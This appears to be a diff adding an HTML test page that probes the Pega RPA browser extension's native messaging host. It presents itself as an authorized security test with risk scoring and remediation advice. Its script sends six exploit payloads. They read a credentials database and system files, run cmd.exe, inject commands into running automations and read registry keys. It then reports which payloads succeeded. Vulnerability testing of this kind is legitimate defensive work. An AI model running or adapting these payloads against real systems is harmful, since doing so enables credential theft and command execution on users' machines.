@@ -1,0 +1,430 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pega RPA Security Test - paystream.cc/testme</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #1e1e1e;
+            color: #00ff00;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+        }
+        h1 {
+            color: #ff6b6b;
+            border-bottom: 2px solid #ff6b6b;
+            padding-bottom: 10px;
+        }
+        .test {
+            background: #2d2d2d;
+            border-left: 4px solid #4a4a4a;
+            padding: 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+        .test.running {
+            border-left-color: #ffff00;
+            background: #3a3a2a;
+        }
+        .test.passed {
+            border-left-color: #00ff00;
+            background: #2a3a2a;
+        }
+        .test.failed {
+            border-left-color: #ff0000;
+            background: #3a2a2a;
+        }
+        .test-title {
+            font-weight: bold;
+            color: #00ff00;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+        .test-result {
+            color: #ffff00;
+            margin: 5px 0;
+            padding: 5px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 2px;
+        }
+        .test-result.success {
+            color: #ff6b6b;
+            background: rgba(255, 0, 0, 0.1);
+        }
+        .test-result.failure {
+            color: #00ff00;
+            background: rgba(0, 255, 0, 0.1);
+        }
+        .summary {
+            margin-top: 30px;
+            padding: 20px;
+            background: #2d2d2d;
+            border: 2px solid #ffff00;
+            border-radius: 4px;
+        }
+        .summary h2 {
+            color: #ffff00;
+            margin-top: 0;
+        }
+        .risk-level {
+            font-size: 1.3em;
+            font-weight: bold;
+            padding: 10px;
+            border-radius: 4px;
+            margin: 10px 0;
+        }
+        .risk-critical {
+            background: #ff0000;
+            color: white;
+        }
+        .risk-high {
+            background: #ff6b00;
+            color: white;
+        }
+        .risk-medium {
+            background: #ffff00;
+            color: black;
+        }
+        .button-group {
+            margin: 20px 0;
+            display: flex;
+            gap: 10px;
+        }
+        button {
+            padding: 10px 20px;
+            background: #0066cc;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-size: 1em;
+        }
+        button:hover {
+            background: #0080ff;
+        }
+        .warning {
+            background: #ffff00;
+            color: black;
+            padding: 15px;
+            border-radius: 4px;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔓 Pega RPA Extension Security Test</h1>
+        
+        <div class="warning">
+            ⚠️ WARNING: This page attempts to exploit the Pega RPA browser extension.<br>
+            This is for AUTHORIZED SECURITY TESTING ONLY.<br>
+            Unauthorized use may violate computer fraud laws.
+        </div>
+
+        <div class="button-group">
+            <button onclick="runAllTests()">▶️ Run All Tests</button>
+            <button onclick="clearResults()">🔄 Clear Results</button>
+            <button onclick="downloadResults()">💾 Download Results</button>
+        </div>
+
+        <div id="tests-container"></div>
+        <div id="summary-container"></div>
+    </div>
+
+    <script>
+        // Track results
+        const testResults = {
+            tests: [],
+            startTime: null,
+            endTime: null
+        };
+
+        // Test configuration
+        const TESTS = [
+            {
+                id: 'test1',
+                name: 'Test 1: Credential File Access',
+                description: 'Attempt to read automation credentials from disk',
+                payload: {
+                    'action': 'readFile',
+                    'path': '${APPDATA}\\Pegasystems\\credentials.db'
+                },
+                expectedVulnerable: true
+            },
+            {
+                id: 'test2',
+                name: 'Test 2: Automation Discovery',
+                description: 'Discover what automations are currently running',
+                payload: {
+                    'action': 'listRunningAutomations'
+                },
+                expectedVulnerable: true
+            },
+            {
+                id: 'test3',
+                name: 'Test 3: Command Execution',
+                description: 'Attempt to execute system command via native messaging',
+                payload: {
+                    'action': 'executeCommand',
+                    'command': 'cmd.exe',
+                    'args': ['/c', 'whoami > C:\\temp\\test.txt']
+                },
+                expectedVulnerable: true
+            },
+            {
+                id: 'test4',
+                name: 'Test 4: System File Access',
+                description: 'Read Windows system files (hosts file)',
+                payload: {
+                    'action': 'readFile',
+                    'path': 'C:\\Windows\\System32\\drivers\\etc\\hosts'
+                },
+                expectedVulnerable: true
+            },
+            {
+                id: 'test5',
+                name: 'Test 5: Automation Injection',
+                description: 'Inject command into running automation',
+                payload: {
+                    'action': 'injectCommand',
+                    'automationId': 'test_automation',
+                    'command': 'maliciousCommand'
+                },
+                expectedVulnerable: true
+            },
+            {
+                id: 'test6',
+                name: 'Test 6: Registry Access',
+                description: 'Attempt to access Windows Registry',
+                payload: {
+                    'action': 'readRegistry',
+                    'hive': 'HKCU',
+                    'key': 'SOFTWARE\\Pegasystems'
+                },
+                expectedVulnerable: true
+            }
+        ];
+
+        // Add test container HTML
+        function initializeUI() {
+            const container = document.getElementById('tests-container');
+            TESTS.forEach(test => {
+                const testDiv = document.createElement('div');
+                testDiv.id = test.id;
+                testDiv.className = 'test';
+                testDiv.innerHTML = `
+                    <div class="test-title">${test.name}</div>
+                    <div style="color: #888; font-size: 0.9em; margin-bottom: 10px;">${test.description}</div>
+                    <div class="test-result" id="${test.id}-result">Waiting to run...</div>
+                `;
+                container.appendChild(testDiv);
+            });
+        }
+
+        // Run a single test
+        async function runTest(testConfig) {
+            return new Promise((resolve) => {
+                const testDiv = document.getElementById(testConfig.id);
+                const resultDiv = document.getElementById(`${testConfig.id}-result`);
+                
+                testDiv.classList.add('running');
+                resultDiv.textContent = '⏳ Running...';
+                
+                console.log(`[${testConfig.name}] Attempting...`, testConfig.payload);
+                
+                chrome.runtime.sendNativeMessage(
+                    'pega.web.chrome.messaginghost',
+                    testConfig.payload,
+                    (response) => {
+                        let success = false;
+                        let message = '';
+                        
+                        if (chrome.runtime.lastError) {
+                            message = `❌ BLOCKED: ${chrome.runtime.lastError.message}`;
+                            console.log(`[${testConfig.name}] Extension blocked:`, chrome.runtime.lastError.message);
+                            testDiv.classList.remove('running');
+                            testDiv.classList.add('failed');
+                        } else if (response && response.error) {
+                            message = `❌ ERROR: ${response.error}`;
+                            console.log(`[${testConfig.name}] Error response:`, response.error);
+                            testDiv.classList.remove('running');
+                            testDiv.classList.add('failed');
+                        } else if (response) {
+                            success = true;
+                            message = `🔴 VULNERABLE: ${JSON.stringify(response).substring(0, 100)}...`;
+                            console.log(`[${testConfig.name}] SUCCESS - Response:`, response);
+                            testDiv.classList.remove('running');
+                            testDiv.classList.add('passed');
+                        } else {
+                            message = `❓ No response (may be blocked)`;
+                            testDiv.classList.remove('running');
+                            testDiv.classList.add('failed');
+                        }
+                        
+                        resultDiv.textContent = message;
+                        resultDiv.className = success ? 'test-result success' : 'test-result failure';
+                        
+                        testResults.tests.push({
+                            testName: testConfig.name,
+                            payload: testConfig.payload,
+                            vulnerable: success,
+                            message: message,
+                            timestamp: new Date().toISOString()
+                        });
+                        
+                        resolve({ success, message });
+                    }
+                );
+                
+                // Timeout after 5 seconds
+                setTimeout(() => {
+                    if (testDiv.classList.contains('running')) {
+                        testDiv.classList.remove('running');
+                        testDiv.classList.add('failed');
+                        resultDiv.textContent = '❌ TIMEOUT (likely blocked)';
+                        resolve({ success: false, message: 'Timeout' });
+                    }
+                }, 5000);
+            });
+        }
+
+        // Run all tests
+        async function runAllTests() {
+            testResults.tests = [];
+            testResults.startTime = new Date().toISOString();
+            
+            console.log('%c=== PEGA RPA SECURITY TEST STARTED ===', 'color: red; font-size: 14px; font-weight: bold');
+            console.log('Time:', testResults.startTime);
+            console.log('Tests to run:', TESTS.length);
+            
+            for (const test of TESTS) {
+                await runTest(test);
+                await new Promise(resolve => setTimeout(resolve, 500)); // 500ms delay between tests
+            }
+            
+            testResults.endTime = new Date().toISOString();
+            showSummary();
+            
+            console.log('%c=== PEGA RPA SECURITY TEST COMPLETED ===', 'color: red; font-size: 14px; font-weight: bold');
+            console.log('Results:', testResults);
+        }
+
+        // Show summary
+        function showSummary() {
+            const vulnerable = testResults.tests.filter(t => t.vulnerable).length;
+            const total = testResults.tests.length;
+            const vulnPercent = Math.round((vulnerable / total) * 100);
+            
+            let riskLevel = 'UNKNOWN';
+            let riskClass = '';
+            
+            if (vulnerable === 0) {
+                riskLevel = '✅ SECURE';
+                riskClass = 'risk-medium';
+            } else if (vulnerable <= 2) {
+                riskLevel = '🟠 MEDIUM RISK';
+                riskClass = 'risk-medium';
+            } else if (vulnerable <= 4) {
+                riskLevel = '🔴 HIGH RISK';
+                riskClass = 'risk-high';
+            } else {
+                riskLevel = '🔴🔴 CRITICAL RISK';
+                riskClass = 'risk-critical';
+            }
+            
+            let summaryHTML = `
+                <h2>📊 Test Summary</h2>
+                <div class="risk-level ${riskClass}">
+                    ${riskLevel}
+                </div>
+                
+                <p><strong>Results:</strong> ${vulnerable} of ${total} tests successful (${vulnPercent}% vulnerable)</p>
+                <p><strong>Test Duration:</strong> ${testResults.startTime} to ${testResults.endTime}</p>
+                
+                <h3>Vulnerable Operations:</h3>
+                <ul>
+            `;
+            
+            testResults.tests.forEach(test => {
+                if (test.vulnerable) {
+                    summaryHTML += `<li><strong>${test.testName}</strong> - ${test.message}</li>`;
+                }
+            });
+            
+            summaryHTML += `
+                </ul>
+                
+                <h3>Security Implications:</h3>
+                <div style="background: rgba(255,0,0,0.1); padding: 10px; border-radius: 4px; margin: 10px 0;">
+                    <strong>Risk Analysis:</strong><br>
+                    ${generateRiskAnalysis(vulnerable)}<br>
+                    <br>
+                    <strong>Recommendation:</strong><br>
+                    ${generateRecommendation(vulnerable)}
+                </div>
+            `;
+            
+            const container = document.getElementById('summary-container');
+            container.innerHTML = `<div class="summary">${summaryHTML}</div>`;
+        }
+
+        function generateRiskAnalysis(vulnerableCount) {
+            if (vulnerableCount === 0) {
+                return '✅ No vulnerabilities detected. Extension appears to have security protections in place.';
+            } else if (vulnerableCount <= 2) {
+                return '⚠️ Limited vulnerabilities. Some credential/command operations may be accessible. Review remediation.';
+            } else if (vulnerableCount <= 4) {
+                return '🔴 Significant vulnerabilities. Credentials and automations can be accessed from any website. Urgent remediation required.';
+            } else {
+                return '🔴🔴 Critical vulnerabilities. Any website can steal credentials and inject commands. DO NOT use in production.';
+            }
+        }
+
+        function generateRecommendation(vulnerableCount) {
+            if (vulnerableCount === 0) {
+                return 'No immediate action required. Continue to monitor for new vulnerabilities.';
+            } else if (vulnerableCount <= 2) {
+                return 'Implement the fixes from the Remediation Guide (Phase 1-2). Timeline: 1 week.';
+            } else if (vulnerableCount <= 4) {
+                return 'Implement ALL fixes from Remediation Guide immediately. Do not deploy to production. Timeline: 2-3 weeks.';
+            } else {
+                return 'CRITICAL: Stop all production use. Implement all security fixes before continuing. Timeline: 1-2 weeks intensive.';
+            }
+        }
+
+        function clearResults() {
+            document.getElementById('tests-container').innerHTML = '';
+            document.getElementById('summary-container').innerHTML = '';
+            testResults.tests = [];
+            initializeUI();
+        }
+
+        function downloadResults() {
+            const dataStr = JSON.stringify(testResults, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            const url = URL.createObjectURL(dataBlob);
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = `pega_security_test_${new Date().toISOString().replace(/[:.]/g, '-')}.json`;
+            link.click();
+        }
+
+        // Initialize on load
+        window.addEventListener('load', () => {
+            initializeUI();
+            console.log('%cPega RPA Security Test Ready', 'color: green; font-size: 12px; font-weight: bold');
+            console.log('Click "Run All Tests" button to start testing');
+            console.log('Or call runAllTests() in console');
+        });
+    </script>
+</body>
+</html>
+
